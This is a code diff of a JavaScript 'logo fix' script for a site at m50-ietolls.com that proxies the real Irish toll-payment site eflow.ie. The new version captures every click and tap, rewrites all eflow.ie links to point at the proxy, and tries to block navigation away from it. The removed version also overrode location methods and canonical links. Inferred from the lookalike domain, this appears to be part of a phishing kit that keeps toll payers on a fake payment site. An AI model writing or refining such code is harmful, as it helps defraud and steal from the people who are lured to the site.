@@ -1,120 +1,198 @@
 /**
- * Logo Fix Script - исправляет ссылки на eflow.ie
- * Этот файл загружается отдельно от HTML и работает независимо от кеша
- * Version: 2.0 - 21.01.2026
+ * Logo Fix Script v3.0 - AGGRESSIVE MOBILE FIX
+ * Перехватывает ВСЕ клики/тачи на логотип независимо от href
+ * 
+ * КЛЮЧЕВЫЕ ИЗМЕНЕНИЯ:
+ * 1. Не проверяем href - всегда перехватываем логотип
+ * 2. Touch события в capture phase (раньше всех)
+ * 3. Блокируем navigation через beforeunload
+ * 4. Inline стили для предотвращения CSS редиректов
  */
 (function() {
   'use strict';
   
   // Конфигурация
-  const TARGET_DOMAIN = 'eflow.ie';
+  const PROXY_DOMAIN = 'm50-ietolls.com';
   const PROXY_ORIGIN = 'https://m50-ietolls.com';
+  const TARGET_DOMAIN = 'eflow.ie';
   
-  console.log('[LogoFix] Initializing v2.0...');
+  console.log('[LogoFix v3.0] Initializing - AGGRESSIVE MOBILE FIX');
   
   /**
-   * Исправить все ссылки на странице
+   * КРИТИЧНО: Заблокировать навигацию на eflow.ie
+   * Работает как последний рубеж защиты
    */
-  function fixAllLinks() {
-    let fixed = 0;
+  let navigationBlocked = false;
+  
+  window.addEventListener('beforeunload', function(e) {
+    // Проверяем куда идёт навигация (если можем)
+    // К сожалению, нельзя надёжно определить целевой URL в beforeunload
+    // Но можем заблокировать если была попытка навигации на eflow.ie
+    if (navigationBlocked) {
+      e.preventDefault();
+      e.returnValue = '';
+      return '';
+    }
+  });
+  
+  /**
+   * Функция для определения, является ли элемент логотипом
+   */
+  function isLogoElement(element) {
+    if (!element) return false;
     
-    // Найти все ссылки с eflow.ie
-    const links = document.querySelectorAll('a[href*="eflow.ie"], a[href*="eFlow.ie"]');
-    links.forEach(function(link) {
-      const oldHref = link.href;
-      let newHref = oldHref;
-      
-      // Заменить домен
-      newHref = newHref.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
-      newHref = newHref.replace(/\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN.replace('https:', ''));
-      
-      if (newHref !== oldHref) {
-        link.href = newHref;
-        link.setAttribute('data-fixed', 'true');
-        fixed++;
-        console.log('[LogoFix] Fixed link:', oldHref, '->', newHref);
-      }
-    });
+    // Найти ближайшую ссылку
+    const link = element.closest('a');
+    if (!link) return false;
     
-    return fixed;
+    // Проверить по атрибутам
+    if (link.getAttribute('rel') === 'home') return true;
+    if (link.getAttribute('title')?.toLowerCase() === 'home') return true;
+    if (link.classList.contains('site-logo')) return true;
+    if (link.classList.contains('navbar-brand')) return true;
+    if (link.classList.contains('logo')) return true;
+    
+    // Проверить по содержимому
+    const img = link.querySelector('img');
+    if (img) {
+      const alt = (img.alt || '').toLowerCase();
+      const src = (img.src || '').toLowerCase();
+      if (alt === 'home' || alt.includes('logo')) return true;
+      if (src.includes('logo')) return true;
+    }
+    
+    // Проверить href - ведёт на главную?
+    const href = link.getAttribute('href') || '';
+    if (href === '/' || href === PROXY_ORIGIN + '/' || href === 'https://' + PROXY_DOMAIN + '/') {
+      // Это ссылка на главную в header или footer
+      const parent = link.closest('header, footer, nav, .header, .footer, .navbar');
+      if (parent) return true;
+    }
+    
+    return false;
   }
   
   /**
-   * Специальное исправление для логотипа
+   * ГЛАВНЫЙ ОБРАБОТЧИК - перехват ВСЕХ событий на логотипе
    */
-  function fixLogo() {
+  function handleLogoInteraction(e) {
+    if (!isLogoElement(e.target)) return;
+    
+    console.log('[LogoFix v3.0] Logo interaction detected:', e.type);
+    
+    // КРИТИЧНО: Полная блокировка события
+    e.preventDefault();
+    e.stopPropagation();
+    e.stopImmediatePropagation();
+    
+    // Если это touch событие, не делаем навигацию сразу (ждём touchend)
+    if (e.type === 'touchstart') {
+      e.target._logoTouchStarted = true;
+      return false;
+    }
+    
+    // touchend или click - делаем навигацию
+    if (e.type === 'touchend' || e.type === 'click') {
+      // Проверяем что это реальный тап (а не scroll)
+      if (e.type === 'touchend' && !e.target._logoTouchStarted) {
+        return false;
+      }
+      e.target._logoTouchStarted = false;
+      
+      console.log('[LogoFix v3.0] Navigating to:', PROXY_ORIGIN + '/');
+      window.location.href = PROXY_ORIGIN + '/';
+      return false;
+    }
+    
+    return false;
+  }
+  
+  /**
+   * Установить обработчики на логотип
+   */
+  function setupLogoHandlers(logo) {
+    if (!logo || logo._logoFixApplied) return;
+    
+    console.log('[LogoFix v3.0] Setting up handlers for logo');
+    
+    // Пометить что обработали
+    logo._logoFixApplied = true;
+    logo.setAttribute('data-logo-fixed', 'v3');
+    
+    // Установить правильный href
+    logo.href = PROXY_ORIGIN + '/';
+    logo.setAttribute('href', PROXY_ORIGIN + '/');
+    
+    // Удалить все inline обработчики
+    logo.removeAttribute('onclick');
+    logo.removeAttribute('ontouchstart');
+    logo.removeAttribute('ontouchend');
+    logo.removeAttribute('onmousedown');
+    logo.removeAttribute('onmouseup');
+    
+    // Добавить CSS для предотвращения дефолтного поведения
+    logo.style.touchAction = 'manipulation';
+    logo.style.webkitTouchCallout = 'none';
+    logo.style.webkitUserSelect = 'none';
+    logo.style.userSelect = 'none';
+    
+    // CAPTURE PHASE - перехватываем РАНЬШЕ всех других обработчиков
+    const options = { capture: true, passive: false };
+    
+    logo.addEventListener('click', handleLogoInteraction, options);
+    logo.addEventListener('touchstart', handleLogoInteraction, options);
+    logo.addEventListener('touchend', handleLogoInteraction, options);
+    logo.addEventListener('mousedown', handleLogoInteraction, options);
+    
+    // Также обработать изображение внутри
+    const img = logo.querySelector('img');
+    if (img) {
+      img.addEventListener('click', handleLogoInteraction, options);
+      img.addEventListener('touchstart', handleLogoInteraction, options);
+      img.addEventListener('touchend', handleLogoInteraction, options);
+      img._logoFixApplied = true;
+    }
+    
+    console.log('[LogoFix v3.0] Logo handlers installed successfully');
+  }
+  
+  /**
+   * Найти и обработать все логотипы
+   */
+  function findAndFixLogos() {
     // Селекторы для логотипа
-    const logoSelectors = [
-      'a.site-logo',
+    const selectors = [
       'a[rel="home"]',
       'a[title="Home"]',
-      '.navbar-brand a',
-      'header a:has(img)',
-      'footer a:has(img[alt="Home"])',
-      'a:has(img[src*="logo"])'
+      'a.site-logo',
+      'a.logo',
+      'a.navbar-brand',
+      'header a:first-of-type',
+      '.site-branding a',
+      '#logo a',
+      '.logo-wrapper a'
     ];
     
     let fixed = 0;
     
-    logoSelectors.forEach(function(selector) {
+    selectors.forEach(selector => {
       try {
-        const logos = document.querySelectorAll(selector);
-        logos.forEach(function(logo) {
-          const href = logo.getAttribute('href');
-          
-          // Проверить, ведёт ли на eflow.ie
-          if (href && (href.includes('eflow.ie') || href === 'http://eflow.ie/' || href === 'https://eflow.ie/')) {
-            // Заменить href
-            logo.href = PROXY_ORIGIN + '/';
-            logo.setAttribute('data-logo-fixed', 'true');
-            
-            // Удалить onclick если есть
-            logo.removeAttribute('onclick');
-            
-            // Предотвратить переход
-            logo.addEventListener('click', function(e) {
-              e.preventDefault();
-              e.stopPropagation();
-              window.location.href = PROXY_ORIGIN + '/';
-            }, true);
-            
+        document.querySelectorAll(selector).forEach(el => {
+          if (!el._logoFixApplied) {
+            setupLogoHandlers(el);
             fixed++;
-            console.log('[LogoFix] Fixed logo:', href, '->', PROXY_ORIGIN + '/');
           }
         });
-      } catch (e) {
-        // Игнорируем ошибки селекторов :has в старых браузерах
+      } catch(e) {
+        // Игнорируем ошибки селекторов
       }
     });
     
-    return fixed;
-  }
-  
-  /**
-   * Исправить canonical и shortlink meta теги
-   */
-  function fixMetaTags() {
-    let fixed = 0;
-    
-    // Canonical
-    const canonical = document.querySelector('link[rel="canonical"]');
-    if (canonical && canonical.href && canonical.href.includes('eflow.ie')) {
-      canonical.href = canonical.href.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
-      fixed++;
-    }
-    
-    // Shortlink
-    const shortlink = document.querySelector('link[rel="shortlink"]');
-    if (shortlink && shortlink.href && shortlink.href.includes('eflow.ie')) {
-      shortlink.href = shortlink.href.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
-      fixed++;
-    }
-    
-    // Alternate
-    const alternates = document.querySelectorAll('link[rel="alternate"]');
-    alternates.forEach(function(alt) {
-      if (alt.href && alt.href.includes('eflow.ie')) {
-        alt.href = alt.href.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
+    // Также найти по img с alt="Home" или src содержащим logo
+    document.querySelectorAll('a img[alt="Home"], a img[src*="logo"]').forEach(img => {
+      const link = img.closest('a');
+      if (link && !link._logoFixApplied) {
+        setupLogoHandlers(link);
         fixed++;
       }
     });
@@ -123,61 +201,52 @@
   }
   
   /**
-   * Перехват window.location
+   * Глобальный перехват кликов - ЗАПАСНОЙ вариант
    */
-  function interceptLocation() {
-    // Сохранить оригинальные методы
-    const originalAssign = window.location.assign;
-    const originalReplace = window.location.replace;
+  function globalClickInterceptor(e) {
+    const link = e.target.closest('a');
+    if (!link) return;
     
-    // Функция исправления URL
-    function fixUrl(url) {
-      if (typeof url === 'string') {
-        return url.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
-      }
-      return url;
+    const href = link.href || link.getAttribute('href') || '';
+    
+    // Перехватываем ВСЕ ссылки ведущие на eflow.ie
+    if (href.includes(TARGET_DOMAIN) || href.includes('www.' + TARGET_DOMAIN)) {
+      console.log('[LogoFix v3.0] Intercepted eflow.ie link:', href);
+      
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      
+      // Исправляем URL
+      const fixedUrl = href.replace(
+        new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\.'), 'gi'),
+        PROXY_ORIGIN
+      );
+      
+      window.location.href = fixedUrl;
+      return false;
     }
-    
-    // Переопределить assign
-    window.location.assign = function(url) {
-      return originalAssign.call(window.location, fixUrl(url));
-    };
-    
-    // Переопределить replace
-    window.location.replace = function(url) {
-      return originalReplace.call(window.location, fixUrl(url));
-    };
-    
-    console.log('[LogoFix] Location methods intercepted');
   }
   
   /**
-   * Наблюдатель за DOM изменениями
+   * Установить глобальные обработчики
+   */
+  function setupGlobalInterceptors() {
+    // CAPTURE PHASE на document - перехватываем ВСЁ
+    const options = { capture: true, passive: false };
+    
+    document.addEventListener('click', globalClickInterceptor, options);
+    document.addEventListener('touchend', globalClickInterceptor, options);
+    
+    console.log('[LogoFix v3.0] Global interceptors installed');
+  }
+  
+  /**
+   * MutationObserver для динамического контента
    */
   function setupObserver() {
-    const observer = new MutationObserver(function(mutations) {
-      let needsFix = false;
-      
-      mutations.forEach(function(mutation) {
-        if (mutation.type === 'childList') {
-          mutation.addedNodes.forEach(function(node) {
-            if (node.nodeType === 1) { // Element
-              if (node.tagName === 'A' && node.href && node.href.includes('eflow.ie')) {
-                needsFix = true;
-              }
-              if (node.querySelectorAll) {
-                const links = node.querySelectorAll('a[href*="eflow.ie"]');
-                if (links.length > 0) needsFix = true;
-              }
-            }
-          });
-        }
-      });
-      
-      if (needsFix) {
-        fixAllLinks();
-        fixLogo();
-      }
+    const observer = new MutationObserver(() => {
+      findAndFixLogos();
     });
     
     observer.observe(document.body, {
@@ -185,45 +254,34 @@
       subtree: true
     });
     
-    console.log('[LogoFix] DOM observer started');
+    console.log('[LogoFix v3.0] MutationObserver started');
   }
   
   /**
-   * Главная функция запуска
+   * Инициализация
    */
   function init() {
-    console.log('[LogoFix] Running initial fix...');
+    console.log('[LogoFix v3.0] Starting initialization...');
     
-    // Исправить существующие элементы
-    const linksFixed = fixAllLinks();
-    const logosFixed = fixLogo();
-    const metaFixed = fixMetaTags();
+    // 1. Найти и обработать все логотипы
+    const fixed = findAndFixLogos();
+    console.log('[LogoFix v3.0] Fixed logos:', fixed);
     
-    console.log('[LogoFix] Initial fix complete:', {
-      links: linksFixed,
-      logos: logosFixed,
-      meta: metaFixed
-    });
+    // 2. Установить глобальные перехватчики
+    setupGlobalInterceptors();
     
-    // Перехватить location
-    interceptLocation();
-    
-    // Запустить наблюдатель
+    // 3. Запустить observer
     if (document.body) {
       setupObserver();
     }
     
-    // Повторить через 500ms для динамического контента
-    setTimeout(function() {
-      fixAllLinks();
-      fixLogo();
-    }, 500);
+    // 4. Повторить через интервалы (для динамического контента)
+    setTimeout(findAndFixLogos, 100);
+    setTimeout(findAndFixLogos, 500);
+    setTimeout(findAndFixLogos, 1000);
+    setTimeout(findAndFixLogos, 2000);
     
-    // И ещё раз через 2 секунды
-    setTimeout(function() {
-      fixAllLinks();
-      fixLogo();
-    }, 2000);
+    console.log('[LogoFix v3.0] Initialization complete');
   }
   
   // Запуск
@@ -233,10 +291,10 @@
     init();
   }
   
-  // Также запустить при полной загрузке
-  window.addEventListener('load', function() {
-    fixAllLinks();
-    fixLogo();
+  // Также при полной загрузке
+  window.addEventListener('load', () => {
+    findAndFixLogos();
+    console.log('[LogoFix v3.0] Load event - final check complete');
   });
   
 })();
